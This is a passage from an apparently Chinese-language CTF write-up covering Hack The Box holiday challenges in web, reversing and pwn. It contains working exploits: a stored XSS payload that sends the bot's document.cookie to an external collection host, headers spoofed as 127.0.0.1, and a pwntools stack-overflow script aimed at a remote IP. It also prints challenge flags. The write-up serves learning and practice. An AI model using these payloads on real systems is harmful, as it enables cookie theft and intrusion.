class="string">&#x27;--disable-translate&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--hide-scrollbars&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--metrics-recording-only&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--mute-audio&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--no-first-run&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--safebrowsing-disable-auto-update&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--js-flags=--noexpose_wasm,--jitless&#x27;</span></span><br><span class="line">	]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cookies = [&#123;</span><br><span class="line">	<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span></span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">readQueries</span> = <span class="keyword">async</span> (<span class="params">db</span>) =&gt; &#123;</span><br><span class="line">		<span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(browser_options);</span><br><span class="line">		<span class="keyword">let</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line">		<span class="keyword">let</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>();</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:1337/&#x27;</span>);</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">setCookie</span>(...cookies);</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:1337/queries&#x27;</span>, &#123;</span><br><span class="line">			<span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle2&#x27;</span></span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">		<span class="keyword">await</span> db.<span class="title function_">migrate</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; readQueries &#125;;</span><br></pre></td></tr></table></figure>
<p>router/index.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express        = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router         = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> bot            = <span class="built_in">require</span>(<span class="string">&#x27;../bot&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> db;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">response</span> = data =&gt; (&#123; <span class="attr">message</span>: data &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> &#123; query &#125; = req.<span class="property">body</span>;</span><br><span class="line">		<span class="keyword">if</span>(query)&#123;</span><br><span class="line">			<span class="keyword">return</span> db.<span class="title function_">addQuery</span>(query)</span><br><span class="line">				.<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">					bot.<span class="title function_">readQueries</span>(db);</span><br><span class="line">					res.<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">&#x27;Your message is delivered successfully!&#x27;</span>));</span><br><span class="line">				&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">&#x27;Please write your query first!&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/queries&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">ip</span> != <span class="string">&#x27;127.0.0.1&#x27;</span>) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> db.<span class="title function_">getQueries</span>()</span><br><span class="line">		.<span class="title function_">then</span>(<span class="function"><span class="params">queries</span> =&gt;</span> &#123;</span><br><span class="line">			res.<span class="title function_">render</span>(<span class="string">&#x27;queries&#x27;</span>, &#123; queries &#125;);</span><br><span class="line">		&#125;)</span><br><span class="line">		.<span class="title function_">catch</span>(<span class="function">() =&gt;</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">&#x27;Something went wrong!&#x27;</span>)));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function"><span class="params">database</span> =&gt;</span> &#123; </span><br><span class="line">	db = database;</span><br><span class="line">	<span class="keyword">return</span> router;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>XSS漏洞，利用在线的xss平台，直接打。exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://68.183.40.128:30700/api/submit&quot;</span></span><br><span class="line"></span><br><span class="line">payload = json.dumps(&#123;</span><br><span class="line">  <span class="string">&quot;query&quot;</span>: <span class="string">&quot;&lt;/p&gt;&lt;script&gt;document.location=&#x27;http://xsshs.cn/mjI1/xss.jpg?cookie=&#x27;+document.cookie;&lt;/script&gt;&lt;p&gt;&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">headers = &#123;</span><br><span class="line">  <span class="string">&#x27;Proxy-Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://68.183.40.128:30700&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://68.183.40.128:30700/&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,ko;q=0.7&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;x-forwarded-for&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;x-originating-ip&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;x-remote-ip&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;x-remote-addr&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:10809&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="comment"># HTB&#123;3v1l_3lv3s_4r3_r1s1ng_up!&#125;</span></span><br></pre></td></tr></table></figure>
<p>攻击结果：</p>
<p><img src="https://s2.loli.net/2022/01/02/6hJrKjzYSLyval7.png" alt="image"></p>
<hr>
<h3 id="Toy-Management"><a href="#Toy-Management" class="headerlink" title="Toy Management"></a>Toy Management</h3><p>初步认定为jwt问题</p>
<hr>
<h2 id="REV"><a href="#REV" class="headerlink" title="REV"></a>REV</h2><h3 id="Infiltration"><a href="#Infiltration" class="headerlink" title="Infiltration"></a>Infiltration</h3><p>动态调试即可</p>
<p>flag：HTB{n0t_qu1t3_s0_0p4qu3}</p>
<hr>
<h3 id="Gift-Wrapping"><a href="#Gift-Wrapping" class="headerlink" title="Gift Wrapping"></a>Gift Wrapping</h3><p>upx 加壳，可以直接脱壳</p>
<p><img src="https://s2.loli.net/2022/01/02/CGqhfgkwnTAmEXi.png" alt="image"></p>
<p>加密逻辑：</p>
<p><img src="https://s2.loli.net/2022/01/02/QwvVnExlpkePtdX.png" alt="image"></p>
<p><img src="https://s2.loli.net/2022/01/02/pv6IeERXK1HwhiA.png" alt="image"></p>
<p><code>HTB&#123;upx_41nt_50_h4rd!!&#125;</code></p>
<hr>
<h3 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h3><p>两个文件，一个是加密的流量和一个加密的脚本。asm加密脚本：</p>
<p>intercept.asm</p>
<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="code"><pre><span class="line">	.text</span><br><span class="line">	.globl	state</span><br><span class="line">	.bss</span><br><span class="line">	.type	state, @object</span><br><span class="line">	.size	state, 1</span><br><span class="line">state:</span><br><span class="line">	.zero	1</span><br><span class="line">	.text</span><br><span class="line">	.globl	do_encrypt</span><br><span class="line">	.type	do_encrypt, @function</span><br><span class="line">do_encrypt:</span><br><span class="line">	push	rbp</span><br><span class="line">	mov	rbp, rsp</span><br><span class="line">	mov	eax, edi</span><br><span class="line">	mov	BYTE PTR [rbp-4], al</span><br><span class="line">	movzx	eax, BYTE PTR state[rip]</span><br><span class="line">	add	eax, 19</span><br><span class="line">	xor	BYTE PTR [rbp-4], al</span><br><span class="line">	movzx	eax, BYTE PTR state[rip]</span><br><span class="line">	add	eax, 55</span><br><span class="line">	mov	BYTE PTR state[rip], al</span><br><span class="line">	movzx	eax, BYTE PTR [rbp-4]</span><br><span class="line">	pop	rbp</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>加密流量为：</p>
<p><img src="https://s2.loli.net/2022/01/02/M2FDJKVZt1m4uWq.png" alt="image"></p>
<p>逆向汇编代码，可得加密代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">enc</span>):</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(i^(<span class="number">19</span>+a)&amp;<span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        a = (a+<span class="number">55</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dec(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;5b2fedd4801914e7eb765119d4fe6223f1d1984638a9816b5419dac07b27eed9d35e09fdef65521ac5877a24eed19b0c0ae9f16d4c02cc86773bfaa8924a2ae9a12a2f1dd7923d39eea78d5909f9f57b2a16ddc87d33ada58f1208d4f737755283da1168a3e6cc075e8ce920774ef88d483fb1bb8a440884af7d69e2c5874b3bb3be695d4fd5a97b27e7d7d0572cf0bf665405dbfe4225e19b824813e4b96a4e178a95776fe1d8800b0bf7f0705719c0c37834a8f7a26f1febbe3d7119dad66427d5f58b4259eabc3f3626ded46621d3b0ca441afce552274bd6da1f2a&#x27;</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hello?Is this working?Looks like the connection is establishedOur next meeting will be at at 90.0000, 135.0000Make sure to bring the stolen presents!The password to get <span class="keyword">in</span> will be HTB&#123;pl41nt3xt_4sm?wh4t_n3xt_s0urc3_c0d3?&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="Upgraded"><a href="#Upgraded" class="headerlink" title="Upgraded"></a>Upgraded</h3><p>openssl库实现的AES_256加密，提取iv和key解密即可：</p>
<p>aes.c:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Created by ch3cke on 2021/12/5.</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;algo_aes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;openssl/evp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handleErrors</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">// ERR_print_errors_fp(stderr);</span></span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *plaintext, <span class="type">int</span> plaintext_len, <span class="type">unsigned</span> <span class="type">char</span> *key,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="type">unsigned</span> <span class="type">char</span> *iv, <span class="type">unsigned</span> <span class="type">char</span> *ciphertext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EVP_CIPHER_CTX *ctx;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ciphertext_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and initialise the context */</span></span><br><span class="line">    <span class="keyword">if</span>(!(ctx = <span class="built_in">EVP_CIPHER_CTX_new</span>())) <span class="built_in">handleErrors</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialise the encryption operation. IMPORTANT - ensure you use a key</span></span><br><span class="line"><span class="comment">     * and IV size appropriate for your cipher</span></span><br><span class="line"><span class="comment">     * In this example we are using 256 bit AES (i.e. a 256 bit key). The</span></span><br><span class="line"><span class="comment">     * IV size for *most* modes is the same as the block size. For AES this</span></span><br><span class="line"><span class="comment">     * is 128 bits */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_EncryptInit_ex</span>(ctx, <span class="built_in">EVP_aes_256_cbc</span>(), <span class="literal">NULL</span>, key, iv))</span><br><span class="line">        <span class="built_in">handleErrors</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Provide the message to be encrypted, and obtain the encrypted output.</span></span><br><span class="line"><span class="comment">     * EVP_EncryptUpdate can be called multiple times if necessary</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_EncryptUpdate</span>(ctx, ciphertext, &amp;len, plaintext, plaintext_len))</span><br><span class="line">        <span class="built_in">handleErrors</span>();</span><br><span class="line">    ciphertext_len = len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finalise the encryption. Further ciphertext bytes may be written at</span></span><br><span class="line"><span class="comment">     * this stage.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_EncryptFinal_ex</span>(ctx, ciphertext + len, &amp;len)) <span class="built_in">handleErrors</span>();</span><br><span class="line">    ciphertext_len += len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clean up */</span></span><br><span class="line">    <span class="built_in">EVP_CIPHER_CTX_free</span>(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *ciphertext, <span class="type">int</span> ciphertext_len, <span class="type">unsigned</span> <span class="type">char</span> *key,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="type">unsigned</span> <span class="type">char</span> *iv, <span class="type">unsigned</span> <span class="type">char</span> *plaintext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EVP_CIPHER_CTX *ctx;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> plaintext_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and initialise the context */</span></span><br><span class="line">    <span class="keyword">if</span>(!(ctx = <span class="built_in">EVP_CIPHER_CTX_new</span>())) <span class="built_in">handleErrors</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialise the decryption operation. IMPORTANT - ensure you use a key</span></span><br><span class="line"><span class="comment">     * and IV size appropriate for your cipher</span></span><br><span class="line"><span class="comment">     * In this example we are using 256 bit AES (i.e. a 256 bit key). The</span></span><br><span class="line"><span class="comment">     * IV size for *most* modes is the same as the block size. For AES this</span></span><br><span class="line"><span class="comment">     * is 128 bits */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_DecryptInit_ex</span>(ctx, <span class="built_in">EVP_aes_256_cbc</span>(), <span class="literal">NULL</span>, key, iv))</span><br><span class="line">        <span class="built_in">handleErrors</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Provide the message to be decrypted, and obtain the plaintext output.</span></span><br><span class="line"><span class="comment">     * EVP_DecryptUpdate can be called multiple times if necessary</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_DecryptUpdate</span>(ctx, plaintext, &amp;len, ciphertext, ciphertext_len))</span><br><span class="line">        <span class="built_in">handleErrors</span>();</span><br><span class="line">    plaintext_len = len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finalise the decryption. Further plaintext bytes may be written at</span></span><br><span class="line"><span class="comment">     * this stage.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">EVP_DecryptFinal_ex</span>(ctx, plaintext + len, &amp;len)) <span class="built_in">handleErrors</span>();</span><br><span class="line">    plaintext_len += len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clean up */</span></span><br><span class="line">    <span class="built_in">EVP_CIPHER_CTX_free</span>(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp.c</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;algo_aes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> decryptedtext_len, ciphertext_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">76</span>] = &#123;</span><br><span class="line">            <span class="number">0x99</span>, <span class="number">0x82</span>, <span class="number">0x56</span>, <span class="number">0x34</span>, <span class="number">0xC4</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x53</span>, <span class="number">0x4F</span>, <span class="number">0xF6</span>, <span class="number">0x78</span>, <span class="number">0x93</span>, <span class="number">0x4D</span>, <span class="number">0x9C</span>, <span class="number">0x2A</span>, <span class="number">0xD7</span>,</span><br><span class="line">            <span class="number">0xDE</span>, <span class="number">0x2E</span>, <span class="number">0x9B</span>, <span class="number">0xFB</span>, <span class="number">0x1B</span>, <span class="number">0xC3</span>, <span class="number">0x9C</span>, <span class="number">0x00</span>, <span class="number">0xBC</span>, <span class="number">0xF9</span>, <span class="number">0x2D</span>, <span class="number">0x65</span>, <span class="number">0x82</span>, <span class="number">0x2E</span>, <span class="number">0xE4</span>, <span class="number">0x45</span>,</span><br><span class="line">            <span class="number">0x4F</span>, <span class="number">0x37</span>, <span class="number">0xFE</span>, <span class="number">0x8B</span>, <span class="number">0x2E</span>, <span class="number">0x0C</span>, <span class="number">0x69</span>, <span class="number">0xAB</span>, <span class="number">0xFE</span>, <span class="number">0x11</span>, <span class="number">0x3B</span>, <span class="number">0xA7</span>, <span class="number">0x52</span>, <span class="number">0x8D</span>, <span class="number">0xC7</span>, <span class="number">0xE8</span>,</span><br><span class="line">            <span class="number">0x8E</span>, <span class="number">0xCA</span>, <span class="number">0x91</span>, <span class="number">0x65</span>, <span class="number">0xC0</span>, <span class="number">0xA1</span>, <span class="number">0x3E</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x4F</span>, <span class="number">0x43</span>, <span class="number">0xD1</span>, <span class="number">0xCB</span>, <span class="number">0xFB</span>, <span class="number">0x78</span>, <span class="number">0xF3</span>,</span><br><span class="line">            <span class="number">0x98</span>, <span class="number">0x6A</span>, <span class="number">0xAE</span>, <span class="number">0x4D</span>, <span class="number">0xD2</span>, <span class="number">0x66</span>, <span class="number">0x80</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0xDC</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iv[<span class="number">40</span>] = &#123;</span><br><span class="line">            <span class="number">0x6B</span>, <span class="number">0xD5</span>, <span class="number">0x52</span>, <span class="number">0x77</span>, <span class="number">0x6F</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x04</span>, <span class="number">0xFD</span>, <span class="number">0xE5</span>, <span class="number">0x84</span>, <span class="number">0x23</span>, <span class="number">0xFE</span>,</span><br><span class="line">            <span class="number">0xFF</span>, <span class="number">0x03</span>, <span class="number">0xF2</span>, <span class="number">0x9E</span>, <span class="number">0x49</span>, <span class="number">0x87</span>, <span class="number">0xE5</span>, <span class="number">0x7C</span>, <span class="number">0x33</span>, <span class="number">0xA2</span>, <span class="number">0x3B</span>, <span class="number">0x52</span>, <span class="number">0xA3</span>, <span class="number">0xDF</span>, <span class="number">0x62</span>, <span class="number">0xA8</span>,</span><br><span class="line">            <span class="number">0xC0</span>, <span class="number">0x47</span>, <span class="number">0x9C</span>, <span class="number">0xA9</span>, <span class="number">0xB6</span>, <span class="number">0x2F</span>, <span class="number">0x53</span>, <span class="number">0x8B</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *plaintext =</span><br><span class="line">            <span class="string">&quot;The quick brown fox jumps over the lazy dog1234&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> decryptedtext[<span class="number">48</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ciphertext[<span class="number">48</span>]= &#123;<span class="number">0xff</span> , <span class="number">0x25</span> , <span class="number">0xb1</span> , <span class="number">0xd7</span> , <span class="number">0xad</span> , <span class="number">0xe8</span> , <span class="number">0xcd</span> , <span class="number">0x36</span> , <span class="number">0xbd</span> , <span class="number">0x7d</span> , <span class="number">0x09</span> , <span class="number">0xa6</span> , <span class="number">0x1f</span> , <span class="number">0xf9</span> , <span class="number">0xc1</span> , <span class="number">0xc1</span> , <span class="number">0xad</span> , <span class="number">0x38</span> , <span class="number">0xce</span> , <span class="number">0x29</span> , <span class="number">0x3d</span> , <span class="number">0x84</span> , <span class="number">0xcb</span> , <span class="number">0xe5</span> , <span class="number">0x83</span> , <span class="number">0x9f</span> , <span class="number">0xb6</span> , <span class="number">0x61</span> , <span class="number">0xbe</span> , <span class="number">0xb7</span> , <span class="number">0xea</span> , <span class="number">0x4f</span> , <span class="number">0x76</span> , <span class="number">0x5d</span> , <span class="number">0x2d</span> , <span class="number">0xc4</span> , <span class="number">0x4e</span> , <span class="number">0x2d</span> , <span class="number">0xa6</span> , <span class="number">0x70</span> , <span class="number">0xdc</span> , <span class="number">0x04</span> , <span class="number">0xe3</span> , <span class="number">0xe6</span> , <span class="number">0xbb</span> , <span class="number">0xc1</span> , <span class="number">0x85</span> , <span class="number">0x21</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    ciphertext_len = encrypt(plaintext, strlen(plaintext), key, iv,</span></span><br><span class="line"><span class="comment">//                             ciphertext);</span></span><br><span class="line">    ciphertext_len=<span class="number">48</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ciphertext is %d bytes long:\n&quot;</span>, ciphertext_len);</span><br><span class="line">    decryptedtext_len = <span class="built_in">decrypt</span>(ciphertext, ciphertext_len, key, iv,</span><br><span class="line">                                decryptedtext);</span><br><span class="line">    decryptedtext[decryptedtext_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Show the decrypted text */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted text is:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s~\n&quot;</span>, decryptedtext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// HTB&#123;h4rdc0d1ng_k3ys?r00k13_m15t4k3!&#125;~</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/OfYWPuDArQTEyaw.png" alt="image"></p>
<h3 id="Bamboozled"><a href="#Bamboozled" class="headerlink" title="Bamboozled"></a>Bamboozled</h3><hr>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Mr-Snowy"><a href="#Mr-Snowy" class="headerlink" title="Mr Snowy"></a>Mr Snowy</h3><p>简单栈溢出，使用ret2text，函数溢出点在investigate函数:</p>
<p><img src="https://s2.loli.net/2022/01/02/Iuf7rgZR4kvwjOe.png" alt="image"></p>
<p>存在一个读取<code>flag.txt</code> 文件的函数：</p>
<p><img src="https://s2.loli.net/2022/01/02/iLfTWZr6OqykJGx.png" alt="image"></p>
<p>直接控制返回值为这个函数即可。</p>
<p>测试溢出长度：</p>
<p><img src="https://s2.loli.net/2022/01/02/46LoM1PqROcQkZz.png" alt="image"></p>
<p>长度为72</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x401165 为读取文件函数 </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x401165</span>)</span><br><span class="line">REMOTE = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    p = remote(<span class="string">&#x27;188.166.174.81&#x27;</span>,<span class="number">32009</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./mr_snowy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/I5YCuNrVlSbPyh2.png" alt="image"></p>
<p>flag: <code>HTB&#123;n1c3_try_3lv35_but_n0t_g00d_3n0ugh&#125;</code></p>
<hr>
<h3 id="Sleigh"><a href="#Sleigh" class="headerlink" title="Sleigh"></a>Sleigh</h3><p>溢出点：</p>
<p><img src="https://s2.loli.net/2022/01/02/tP6KvNXqRE1QCyn.png" alt="image"></p>
<p>程序是一个简单的ret2shellcode的程序，程序员会给出一个栈地址，该地址是可执行的：</p>
<p><img src="https://s2.loli.net/2022/01/02/l7YEnWxAKsrityO.png" alt="image"></p>
<p><img src="https://s2.loli.net/2022/01/02/3rJKN1pC6L4Tlhd.png" alt="image"></p>
<p>可以看到写入信息的地址是可以执行的，直接使用ret2shellcode</p>
